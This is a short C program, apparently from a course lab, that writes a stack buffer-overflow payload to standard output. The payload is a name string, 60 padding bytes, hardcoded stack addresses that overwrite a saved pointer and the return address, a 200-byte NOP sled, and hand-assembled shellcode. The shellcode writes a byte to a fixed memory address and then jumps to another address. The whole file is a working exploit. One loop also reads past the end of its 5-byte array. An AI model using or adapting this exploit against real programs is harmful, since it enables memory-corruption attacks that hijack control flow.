#include <stdio.h>
#include <string.h>
char attackString[] = "Rongrong Liu"; //12 characters 
int main() {
	int i;
	char *p = attackString;
	for (i = 0; i < sizeof(attackString) - 1; i++) {
		putchar(*p);
		p++;
	}

	unsigned char zero = 0x00;
	unsigned char nop = 0x90;

	for( i = 0; i < 60; i++){
			
		putchar(zero);
	}

	unsigned char 	protectaddr[4] = {0x38, 0xef, 0xff, 0xbf};

	for( i = 0; i < 4; i++){
		putchar(protectaddr[i]);
	}

	unsigned char 	retbufaddr[4] = {0x50, 0xef, 0xff, 0xbf};

	for( i = 0; i < 4; i++){
		putchar(retbufaddr[i]);
	}

	// insert nop
	for( i = 0; i < 200; i++){
			
		putchar(nop);
	}

	// movb $0x41, 0x804a02c

	unsigned char 	movb[7] = {0xc6, 0x05, 0x2c, 0xa0, 0x04, 0x08, 0x41};

	for( i = 0; i < 7; i++){
		putchar(movb[i]);
	}

 	// push $0x80485dc
 	unsigned char 	push[5] = {0x68, 0xdc, 0x85, 0x04, 0x08};

	for( i = 0; i < 7; i++){
		putchar(push[i]);
	}

 	unsigned char 	ret = 0xc3;

	
	putchar(ret);
		


	return 1;
}